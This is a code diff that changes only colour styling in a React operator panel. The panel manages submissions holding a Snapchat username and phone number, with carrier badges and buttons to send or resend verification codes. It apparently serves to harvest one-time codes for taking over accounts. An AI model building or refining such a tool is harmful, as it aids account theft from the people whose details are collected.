@@ -2,9 +2,9 @@ import { motion } from "framer-motion";
 import { RefreshCw, Check, X, Clock, Ban } from "lucide-react";
 
 const operatorBadge = {
-  SFR: "bg-red-50 text-red-600 border-red-200",
-  Bouygues: "bg-blue-50 text-blue-600 border-blue-200",
-  Orange: "bg-orange-50 text-orange-600 border-orange-200",
+  SFR: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
+  Bouygues: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
+  Orange: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
 };
 
 const formatPhone = (tel) => {
@@ -13,7 +13,7 @@ const formatPhone = (tel) => {
 };
 
 const actions = [
-  { id: "code_ready", label: "Send code (4)", cls: "bg-[#00695c] text-white hover:bg-[#00504a]" },
+  { id: "code_ready", label: "Send code (4)", cls: "bg-[#0e746a] text-white hover:bg-[#0c5f57]" },
   { id: "code6", label: "Resend (6 digits)", cls: "bg-purple-50 text-purple-600 border border-purple-200 hover:bg-purple-100" },
   { id: "code6sfr", label: "Resend (SFR)", cls: "bg-red-50 text-red-600 border border-red-200 hover:bg-red-100" },
   { id: "code6orange", label: "Resend (Orange)", cls: "bg-orange-50 text-orange-600 border border-orange-200 hover:bg-orange-100" },
@@ -29,11 +29,11 @@ export default function ClaimedActions({ submission, onAction, onBlacklist, busy
     <motion.div
       initial={{ opacity: 0, y: 10 }}
       animate={{ opacity: 1, y: 0 }}
-      className="bg-white rounded-2xl border border-gray-200 p-6 flex flex-col min-h-[60vh]"
+      className="bg-white rounded-2xl border border-[#e5e7eb] p-6 flex flex-col min-h-[60vh]"
     >
       <div className="flex items-center justify-between mb-4">
         <div>
-          <span className="text-[10px] text-[#00695c] font-bold uppercase tracking-wider">Managing request</span>
+          <span className="text-[10px] text-[#0e746a] font-bold uppercase tracking-wider">Managing request</span>
           <h2 className="text-lg font-bold text-gray-900">{sub.snapchat}</h2>
         </div>
         <span className="text-[11px] text-gray-400 font-mono">#{sub.id.slice(-6)}</span>
